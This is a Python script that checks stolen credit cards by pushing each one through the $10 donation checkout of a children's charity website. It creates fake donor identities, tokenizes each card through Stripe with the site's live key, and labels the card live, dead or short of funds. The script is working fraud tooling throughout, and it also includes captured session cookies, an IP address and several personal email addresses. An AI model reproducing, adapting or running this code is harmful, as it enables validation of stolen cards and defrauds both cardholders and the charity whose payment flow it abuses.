from tarfile import data_filter
import random, time
from faker import Faker
from random import choice
from tkinter import Tk, filedialog
from httpx import request
import requests,re
from bs4 import BeautifulSoup as b
from bs4 import BeautifulSoup
#from hh import keep_alive
import requests
import json, string, re
import requests
import time
import json
import random, time
from faker import Faker
from random import choice
import asyncio
import requests
from bs4 import BeautifulSoup
import requests
import re
from bs4 import BeautifulSoup as b
from curl_cffi import requests
from bs4 import BeautifulSoup
from fake_useragent import UserAgent
import json
import cloudscraper
from anticaptchaofficial.recaptchav2proxyless import *
import time
def usuario() -> dict:
    number = random.randint(1111, 9999)
    postal = random.choice(['10080', '14925', '71601', '86556', '19980'])
    return { 'name' : Faker().name(), 'email' : Faker().email().replace('@', '{}@'.format(number)), 'username' : Faker().user_name(), 'phone' : '512678{}'.format(number), 'city' : Faker().city(), 'code' : postal }


def capture(data, start, end):
    try:
        star = data.index(start) + len(start)
        last = data.index(end, star)
        return data[star:last]

    except ValueError:
        return None



async def process_card(card):
    max_retries = 15
    retry_count = 0
    while retry_count < max_retries:
        try:
            #============[Funcions Need]============#
            c =  requests.Session()
            
            cc_number, mes, ano_number, cvv = card.split('|')
            if len(ano_number) == 2: ano_number = "20"+ano_number
            agente_user = UserAgent()
           

            #============[Address Found]============#
            name  = usuario()['name'].split(' ')[0]
            last  = usuario()['name'].split(' ')[1]
            email = usuario()['email']
            number = random.randint(1111, 9999)
            street = f"{name} street {number}"
            phone = usuario()['phone']

            #============[Requests 1]============#

            correos = [
                "marilisaqnituk@gmail.com",
                "flortsquitk@gmail.com",
                "quitukferchag@gmail.com",
                "saramanquitk@gmail.com",
                "jorgaioquint@gmail.com",
                "rodrigoking234@gmail.com",
                "rodrigoquituk004@gmail.com",
                "armeida.cate771@gmail.com",
                "viquitukeliander@gmail.com",
                "quityksantome@gmail.com",
                "samanquitguajal@gmail.com",
                "quintkdelgelo@gmail.com",
                "squitukjomilu@gmail.com",
                "lauranquinyuk@gmail.com",
                "rodrigoqgomez@gmail.com",
                "gardunoerick2@gmail.com"
            ]

            correo_seleccionado = random.choice(correos)
            headers = {
                'authority': 'www.children.org',
                'accept': 'application/json, text/javascript, */*; q=0.01',
                'accept-language': 'es-ES,es;q=0.9',
                'cache-control': 'no-cache',
                'content-type': 'application/json',
                # 'cookie': 'lang=en-US; ai_user=bU6KkVWZzcDjgWCpq+YKm6|2025-08-27T19:11:34.829Z; _gcl_au=1.1.871720066.1756321895; _ga=GA1.1.1775010442.1756321895; FPID=FPID2.2.Iex6uzo4D78h%2FWBd3glY2Vav0IgYggHw24uDONWUum8%3D.1756321895; _fbp=fb.1.1756321903808.396721431218584213; __tmbid=us-1739941713-489f6bbcd9974664aad8542d1b29d68b; PersistentSession=CfDJ8N9gCg8DXzJPhyIpqEG59G4TdmhUcuK4-43z8AHD1oxOjqYMmaoHauQcmQWZR6iCZsQwSf7xp-rnfZtkd18XvM1R8SCd7XHT_XAkqahrr2dLwCGSP7fRxehvMRgVtxmaAg; __stripe_mid=781f2a6b-7d64-4ae7-b8da-9c1169ec5207e4c91e; cookieCompliancyAccepted=here; EPiStateMarker=true; EPiNumberOfVisits=2%2C2025-08-27T19%3A11%3A33%2C2025-09-20T02%3A22%3A32; EPiStartUrlKey=https%3A%2F%2Fwww.children.org%2FUtil%2FErrors%2FError404; ARRAffinity=a51bc37fbc8b9f5f3cf468431486b28023ddd7b2fb45ff933e5301c23924b404; ARRAffinitySameSite=a51bc37fbc8b9f5f3cf468431486b28023ddd7b2fb45ff933e5301c23924b404; zSessionId=5TLxTvyC1fCy7KfNPHgYtzbBxmR3y2LAuWd7mAXEqAjC; cookietimer=0; cookietimerid=5TLxTvyC1fCy7KfNPHgYtzbBxmR3y2LAuWd7mAXEqAjC; engagementorigin=https://www.children.org/; 5TLxTvyC1fCy7KfNPHgYtzbBxmR3y2LAuWd7mAXEqAjC_mindmax=5TLxTvyC1fCy7KfNPHgYtzbBxmR3y2LAuWd7mAXEqAjC; mindmaxipaddress=201.148.8.9; mindmaxcity=Tekax; mindmaxsubdivisionisocode=YUC; mindmaxcountryisocode=MX; mindmaxpostalcode=97970; mindmaxusertype=none; mindmaxorganization=izzi; _clck=1nbahci%5E2%5Efzh%5E0%5E2065; FPLC=guw7KDAvdrH9XMegxPSeh9MmkhWDPKu55Mzlb5u1MdbRMDduHTxNOUC8HeTsr3JARdEALuKksi7%2B3VFb6t6CxCQOMWYivMDLW4eozxY2NQdkRz6ZS2dXTA4yH3uWOw%3D%3D; 57942=; 58312=; 58313=; 59942=; 57928=; 58306=; 59941=; 57927=; 57941=; 58305=; pid=; BNES_pid=; gtm_page_view=4; _ga_430T8HQLMJ=GS2.1.s1758334958$o2$g1$t1758334973$j45$l0$h0; Cookie - Page Count=4; FPGSID=1.1758334959.1758334973.G-SFLND5SZVL.ijs3v1N88ZKknfMi0v-v6w.G-430T8HQLMJ.RGhDDBFLsFPRYK9YxqewiA; engagementcount=4; _clsk=48as0u%5E1758334973381%5E4%5E1%5Ej.clarity.ms%2Fcollect; _ga_SFLND5SZVL=GS2.1.s1758334958$o2$g1$t1758334974$j44$l0$h919655568; _uetsid=ae61689095c811f0818b0f9fdf782134|1ngs4ma|2|fzh|0|2089; _uetvid=8fe50b90ee7f11efabd13f9dbfd25fc0|zy3aso|1758334974412|4|1|bat.bing.com/p/conversions/c/l; ai_session=V41TKuniNiIuAN185tAJDB|1758334958499|1758335047673',
                'origin': 'https://www.children.org',
                'pragma': 'no-cache',
                'referer': 'https://www.children.org/make-a-difference/donate',
                'request-id': '|abe42e0366fd4d37a7dd4c51841904b1.5f98824e92c84da2',
                'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'traceparent': '00-abe42e0366fd4d37a7dd4c51841904b1-5f98824e92c84da2-01',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
                'x-requested-with': 'XMLHttpRequest',
            }

            json_data = {
                'Amount': '10',
                'ProductOptionId': 6,
                'Description': 'Our mission',
                'InHonorOfDonation': {},
                'BlockGuid': 'd180694e-c81a-4dee-82a9-ab0e080e0883',
            }

            response = c.post('https://www.children.org/api/cart/add', headers=headers, json=json_data)

            headers = {
                'authority': 'www.children.org',
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'accept-language': 'es-ES,es;q=0.9',
                'cache-control': 'no-cache',
                # 'cookie': 'lang=en-US; ai_user=bU6KkVWZzcDjgWCpq+YKm6|2025-08-27T19:11:34.829Z; _gcl_au=1.1.871720066.1756321895; _ga=GA1.1.1775010442.1756321895; FPID=FPID2.2.Iex6uzo4D78h%2FWBd3glY2Vav0IgYggHw24uDONWUum8%3D.1756321895; _fbp=fb.1.1756321903808.396721431218584213; __tmbid=us-1739941713-489f6bbcd9974664aad8542d1b29d68b; PersistentSession=CfDJ8N9gCg8DXzJPhyIpqEG59G4TdmhUcuK4-43z8AHD1oxOjqYMmaoHauQcmQWZR6iCZsQwSf7xp-rnfZtkd18XvM1R8SCd7XHT_XAkqahrr2dLwCGSP7fRxehvMRgVtxmaAg; __stripe_mid=781f2a6b-7d64-4ae7-b8da-9c1169ec5207e4c91e; cookieCompliancyAccepted=here; EPiStateMarker=true; EPiNumberOfVisits=2%2C2025-08-27T19%3A11%3A33%2C2025-09-20T02%3A22%3A32; EPiStartUrlKey=https%3A%2F%2Fwww.children.org%2FUtil%2FErrors%2FError404; ARRAffinity=a51bc37fbc8b9f5f3cf468431486b28023ddd7b2fb45ff933e5301c23924b404; ARRAffinitySameSite=a51bc37fbc8b9f5f3cf468431486b28023ddd7b2fb45ff933e5301c23924b404; zSessionId=5TLxTvyC1fCy7KfNPHgYtzbBxmR3y2LAuWd7mAXEqAjC; cookietimer=0; cookietimerid=5TLxTvyC1fCy7KfNPHgYtzbBxmR3y2LAuWd7mAXEqAjC; engagementorigin=https://www.children.org/; 5TLxTvyC1fCy7KfNPHgYtzbBxmR3y2LAuWd7mAXEqAjC_mindmax=5TLxTvyC1fCy7KfNPHgYtzbBxmR3y2LAuWd7mAXEqAjC; mindmaxipaddress=201.148.8.9; mindmaxcity=Tekax; mindmaxsubdivisionisocode=YUC; mindmaxcountryisocode=MX; mindmaxpostalcode=97970; mindmaxusertype=none; mindmaxorganization=izzi; _clck=1nbahci%5E2%5Efzh%5E0%5E2065; FPLC=guw7KDAvdrH9XMegxPSeh9MmkhWDPKu55Mzlb5u1MdbRMDduHTxNOUC8HeTsr3JARdEALuKksi7%2B3VFb6t6CxCQOMWYivMDLW4eozxY2NQdkRz6ZS2dXTA4yH3uWOw%3D%3D; 57942=; 58312=; 58313=; 59942=; 57928=; 58306=; 59941=; 57927=; 57941=; 58305=; pid=; BNES_pid=; gtm_page_view=4; _ga_430T8HQLMJ=GS2.1.s1758334958$o2$g1$t1758334973$j45$l0$h0; Cookie - Page Count=4; FPGSID=1.1758334959.1758334973.G-SFLND5SZVL.ijs3v1N88ZKknfMi0v-v6w.G-430T8HQLMJ.RGhDDBFLsFPRYK9YxqewiA; engagementcount=4; _clsk=48as0u%5E1758334973381%5E4%5E1%5Ej.clarity.ms%2Fcollect; _ga_SFLND5SZVL=GS2.1.s1758334958$o2$g1$t1758334974$j44$l0$h919655568; _uetsid=ae61689095c811f0818b0f9fdf782134|1ngs4ma|2|fzh|0|2089; _uetvid=8fe50b90ee7f11efabd13f9dbfd25fc0|zy3aso|1758334974412|4|1|bat.bing.com/p/conversions/c/l; ai_session=V41TKuniNiIuAN185tAJDB|1758334958499|1758335047673',
                'pragma': 'no-cache',
                'referer': 'https://www.children.org/make-a-difference/donate',
                'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-user': '?1',
                'upgrade-insecure-requests': '1',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
            }

            response = c.get('https://www.children.org/checkout', headers=headers)

            headers = {
                'authority': 'www.children.org',
                'accept': 'application/json, text/plain, */*',
                'accept-language': 'es-ES,es;q=0.9',
                'cache-control': 'no-cache',
                'content-type': 'application/json',
                # 'cookie': 'lang=en-US; ai_user=bU6KkVWZzcDjgWCpq+YKm6|2025-08-27T19:11:34.829Z; _ga=GA1.1.1775010442.1756321895; FPID=FPID2.2.Iex6uzo4D78h%2FWBd3glY2Vav0IgYggHw24uDONWUum8%3D.1756321895; _fbp=fb.1.1756321903808.396721431218584213; __tmbid=us-1739941713-489f6bbcd9974664aad8542d1b29d68b; PersistentSession=CfDJ8N9gCg8DXzJPhyIpqEG59G4TdmhUcuK4-43z8AHD1oxOjqYMmaoHauQcmQWZR6iCZsQwSf7xp-rnfZtkd18XvM1R8SCd7XHT_XAkqahrr2dLwCGSP7fRxehvMRgVtxmaAg; __stripe_mid=781f2a6b-7d64-4ae7-b8da-9c1169ec5207e4c91e; cookieCompliancyAccepted=here; EPiStateMarker=true; EPiNumberOfVisits=2%2C2025-08-27T19%3A11%3A33%2C2025-09-20T02%3A22%3A32; EPiStartUrlKey=https%3A%2F%2Fwww.children.org%2FUtil%2FErrors%2FError404; ARRAffinity=a51bc37fbc8b9f5f3cf468431486b28023ddd7b2fb45ff933e5301c23924b404; ARRAffinitySameSite=a51bc37fbc8b9f5f3cf468431486b28023ddd7b2fb45ff933e5301c23924b404; zSessionId=5TLxTvyC1fCy7KfNPHgYtzbBxmR3y2LAuWd7mAXEqAjC; cookietimer=0; cookietimerid=5TLxTvyC1fCy7KfNPHgYtzbBxmR3y2LAuWd7mAXEqAjC; engagementorigin=https://www.children.org/; 5TLxTvyC1fCy7KfNPHgYtzbBxmR3y2LAuWd7mAXEqAjC_mindmax=5TLxTvyC1fCy7KfNPHgYtzbBxmR3y2LAuWd7mAXEqAjC; mindmaxipaddress=201.148.8.9; mindmaxcity=Tekax; mindmaxsubdivisionisocode=YUC; mindmaxcountryisocode=MX; mindmaxpostalcode=97970; mindmaxusertype=none; mindmaxorganization=izzi; _clck=1nbahci%5E2%5Efzh%5E0%5E2065; FPLC=guw7KDAvdrH9XMegxPSeh9MmkhWDPKu55Mzlb5u1MdbRMDduHTxNOUC8HeTsr3JARdEALuKksi7%2B3VFb6t6CxCQOMWYivMDLW4eozxY2NQdkRz6ZS2dXTA4yH3uWOw%3D%3D; 57942=; 58312=; 58313=; 59942=; 57928=; 58306=; 59941=; 57927=; 57941=; 58305=; pid=; BNES_pid=; gtm_page_view=5; Cookie - Page Count=5; engagementcount=5; _clsk=48as0u%5E1758335104855%5E5%5E1%5Ej.clarity.ms%2Fcollect; _ga_430T8HQLMJ=GS2.1.s1758334958$o2$g1$t1758335107$j56$l0$h469671380; __stripe_sid=befcd869-b2e0-455c-89fc-5d3ffbdee25704c073; _uetsid=ae61689095c811f0818b0f9fdf782134|1ngs4ma|2|fzh|0|2089; _uetvid=8fe50b90ee7f11efabd13f9dbfd25fc0|zy3aso|1758335108097|5|1|bat.bing.com/p/conversions/c/l; ai_session=V41TKuniNiIuAN185tAJDB|1758334958499|1758335297658; FPGSID=1.1758334959.1758335330.G-SFLND5SZVL.ijs3v1N88ZKknfMi0v-v6w.G-430T8HQLMJ.RGhDDBFLsFPRYK9YxqewiA; general_email_submitted=dssljwwsk@msn.com; _gcl_au=1.1.871720066.1756321895.748633546.1758335332.1758335331; _ga_SFLND5SZVL=GS2.1.s1758334958$o2$g1$t1758335337$j53$l0$h919655568',
                'origin': 'https://www.children.org',
                'pragma': 'no-cache',
                'referer': 'https://www.children.org/checkout',
                'request-id': '|3EjvJTTf7HVHax6woyRfKkmKFxbW1Cv4z6.9317b4b961cf4ae5',
                'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'traceparent': '00-3EjvJTTf7HVHax6woyRfKkmKFxbW1Cv4z6-9317b4b961cf4ae5-01',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
            }

            json_data = {
                'addressLine1': 'calle o242',
                'addressLine2': '',
                'city': 'Teabo',
                'stateId': '96',
                'postalCode': '97910',
                'countryId': '148',
            }

            response = c.post(
                'https://www.children.org/api/locations/validateAddress',
                headers=headers,
                json=json_data,
            )

            headers = {
                'authority': 'api.stripe.com',
                'accept': 'application/json',
                'accept-language': 'es-ES,es;q=0.9',
                'cache-control': 'no-cache',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://js.stripe.com',
                'pragma': 'no-cache',
                'referer': 'https://js.stripe.com/',
                'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-site',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
            }

            data = f'guid=2953e2d9-6a1c-4c42-a83e-28bb4e237f8577fee5&muid=781f2a6b-7d64-4ae7-b8da-9c1169ec5207e4c91e&sid=befcd869-b2e0-455c-89fc-5d3ffbdee25704c073&referrer=https%3A%2F%2Fwww.children.org&time_on_page=716917&card[number]={cc_number}&card[cvc]={cvv}&card[exp_month]={mes}&card[exp_year]={ano_number}&payment_user_agent=stripe.js%2Ffaac1fc3fb%3B+stripe-js-v3%2Ffaac1fc3fb%3B+split-card-element&pasted_fields=number&client_attribution_metadata[client_session_id]=c99e9310-5d9e-47a0-9171-ad08715ff81e&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=card-element&client_attribution_metadata[merchant_integration_version]=2017&client_attribution_metadata[wallet_config_id]=d629f932-112b-4e97-9e91-a41d9b193964&key=pk_live_51HgrtnHhxqq5H7ZZwjXhFZJ6zBol49y4PFaEvjAdxnBm8lbKIjrAwoGXsJ8lYS9oa2ZzHgDpxe1vHWca6V8y8SMI00NLIdGZFr'

            response = c.post('https://api.stripe.com/v1/tokens', headers=headers, data=data)
            responsePm = json.loads(response.text)
            token = responsePm.get("id")  # devuelve None si no existe
            print("Token:", token)

            headers = {
                'authority': 'www.children.org',
                'accept': 'application/json, text/plain, */*',
                'accept-language': 'es-ES,es;q=0.9',
                'cache-control': 'no-cache',
                'content-type': 'application/json',
                # 'cookie': 'lang=en-US; ai_user=bU6KkVWZzcDjgWCpq+YKm6|2025-08-27T19:11:34.829Z; _ga=GA1.1.1775010442.1756321895; FPID=FPID2.2.Iex6uzo4D78h%2FWBd3glY2Vav0IgYggHw24uDONWUum8%3D.1756321895; _fbp=fb.1.1756321903808.396721431218584213; __tmbid=us-1739941713-489f6bbcd9974664aad8542d1b29d68b; PersistentSession=CfDJ8N9gCg8DXzJPhyIpqEG59G4TdmhUcuK4-43z8AHD1oxOjqYMmaoHauQcmQWZR6iCZsQwSf7xp-rnfZtkd18XvM1R8SCd7XHT_XAkqahrr2dLwCGSP7fRxehvMRgVtxmaAg; __stripe_mid=781f2a6b-7d64-4ae7-b8da-9c1169ec5207e4c91e; cookieCompliancyAccepted=here; EPiStateMarker=true; EPiNumberOfVisits=2%2C2025-08-27T19%3A11%3A33%2C2025-09-20T02%3A22%3A32; EPiStartUrlKey=https%3A%2F%2Fwww.children.org%2FUtil%2FErrors%2FError404; ARRAffinity=a51bc37fbc8b9f5f3cf468431486b28023ddd7b2fb45ff933e5301c23924b404; ARRAffinitySameSite=a51bc37fbc8b9f5f3cf468431486b28023ddd7b2fb45ff933e5301c23924b404; zSessionId=5TLxTvyC1fCy7KfNPHgYtzbBxmR3y2LAuWd7mAXEqAjC; cookietimer=0; cookietimerid=5TLxTvyC1fCy7KfNPHgYtzbBxmR3y2LAuWd7mAXEqAjC; engagementorigin=https://www.children.org/; 5TLxTvyC1fCy7KfNPHgYtzbBxmR3y2LAuWd7mAXEqAjC_mindmax=5TLxTvyC1fCy7KfNPHgYtzbBxmR3y2LAuWd7mAXEqAjC; mindmaxipaddress=201.148.8.9; mindmaxcity=Tekax; mindmaxsubdivisionisocode=YUC; mindmaxcountryisocode=MX; mindmaxpostalcode=97970; mindmaxusertype=none; mindmaxorganization=izzi; _clck=1nbahci%5E2%5Efzh%5E0%5E2065; FPLC=guw7KDAvdrH9XMegxPSeh9MmkhWDPKu55Mzlb5u1MdbRMDduHTxNOUC8HeTsr3JARdEALuKksi7%2B3VFb6t6CxCQOMWYivMDLW4eozxY2NQdkRz6ZS2dXTA4yH3uWOw%3D%3D; 57942=; 58312=; 58313=; 59942=; 57928=; 58306=; 59941=; 57927=; 57941=; 58305=; pid=; BNES_pid=; gtm_page_view=5; Cookie - Page Count=5; engagementcount=5; __stripe_sid=befcd869-b2e0-455c-89fc-5d3ffbdee25704c073; _uetsid=ae61689095c811f0818b0f9fdf782134|1ngs4ma|2|fzh|0|2089; FPGSID=1.1758334959.1758335330.G-SFLND5SZVL.ijs3v1N88ZKknfMi0v-v6w.G-430T8HQLMJ.RGhDDBFLsFPRYK9YxqewiA; _ga_SFLND5SZVL=GS2.1.s1758334958$o2$g1$t1758335346$j44$l0$h919655568; _ga_430T8HQLMJ=GS2.1.s1758334958$o2$g1$t1758335346$j60$l0$h0; _uetvid=8fe50b90ee7f11efabd13f9dbfd25fc0|zy3aso|1758335780942|6|1|bat.bing.com/p/conversions/c/l; _clsk=48as0u%5E1758335781070%5E6%5E1%5Ej.clarity.ms%2Fcollect; _gcl_au=1.1.871720066.1756321895.748633546.1758335332.1758335820; ai_session=V41TKuniNiIuAN185tAJDB|1758334958499|1758335936629',
                'origin': 'https://www.children.org',
                'pragma': 'no-cache',
                'referer': 'https://www.children.org/checkout',
                'request-id': '|3EjvJTTf7HVHax6woyRfKkmKFxbW1Cv4z6.eb0459be60bf4851',
                'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'traceparent': '00-3EjvJTTf7HVHax6woyRfKkmKFxbW1Cv4z6-eb0459be60bf4851-01',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
            }

            json_data = {
                'Details': {
                    'address': {
                        'countryId': '148',
                        'zipCode': '97910',
                        'stateProvinceId': '96',
                        'address1': 'calle o242',
                        'address2': '',
                        'city': 'Teabo',
                        'stateProvince': 'YU',
                    },
                    'email': email,
                    'title': 'Mr.',
                    'firstName': name,
                    'lastName': last,
                    'phone': '9971556986',
                    'cellPhone': '5514696985',
                    'allowMobile': True,
                    'acceptedGDPR': False,
                    'gdprVersion': 0,
                    'allowEmail': True,
                    'currentCountry': {
                        'countryId': 148,
                        'countryAbbr': 'MX',
                        'displayName': 'Mexico',
                        'isPostalAware': True,
                    },
                    'currentState': {
                        'stateProvinceId': 96,
                        'stateProvinceAbbr': 'YU',
                        'displayName': 'Yucatan',
                        'countryId': 148,
                    },
                    'requiresAddressValidation': False,
                    'addressConfirmed': True,
                    'validAddress': True,
                },
                'CreditCardInfo': {
                    'cardType': 'MasterCard',
                    'lastFour': '0581',
                    'expirationMonth': mes,
                    'expirationYear': ano_number,
                    'cardNumber': token,
                    'nameOnCard': f'{name} {last}',
                    'saveCard': True,
                    'token': token,
                },
            }

            response = c.post('https://www.children.org/api/checkout',  headers=headers, json=json_data)
            responsePm = json.loads(response.text)

            status = "error"
            mensaje = "⚠️ Respuesta desconocida"

            # Si hubo error (tarjeta declinada u otro problema)
            if responsePm.get("hasErrors"):
                error_code = (responsePm.get("errorCode") or "").lower()
                error_message = responsePm.get("errors", ["Error desconocido"])[0]

                if error_code == "card_declined":
                    mensaje = f"❌ Tarjeta rechazada: {error_message}"
                    status = "dead"
                elif error_code == "insufficient_funds":
                    mensaje = f"⚠️ Fondos insuficientes: {error_message}"
                    status = "insufficient_funds"
                else:
                    mensaje = f"⚠️ Error: {error_message}"
                    status = "error"

            # Si no hay error → tarjeta LIVE
            else:
                amount_usd = responsePm.get("totalAmount", 0)
                last4 = responsePm.get("receiptPaymentInfo", {}).get("paymentNumberLastFour", "????")
                card_type = responsePm.get("receiptPaymentInfo", {}).get("cardType", "Desconocida")

                # Conversión a pesos (ejemplo: 1 USD = 18.5 MXN)
                tasa_cambio = 18.5
                amount_mxn = round(amount_usd * tasa_cambio, 2)

                mensaje = (
                    f"✅ Tarjeta aprobada\n"
        
                    f"💵 Monto: ${amount_mxn} MXN"
                )
                status = "live"

            print(f"{status.upper()}: {mensaje}")

            # <-- Aquí agregas la tarjeta al return -->
            return {"status": status, "message": mensaje, "cc": card}


        except Exception as e:
            print(e)
            retry_count += 1
    else:
        return {"card": card, "status": "ERROR", "resp":  f"Retries: {retry_count}"}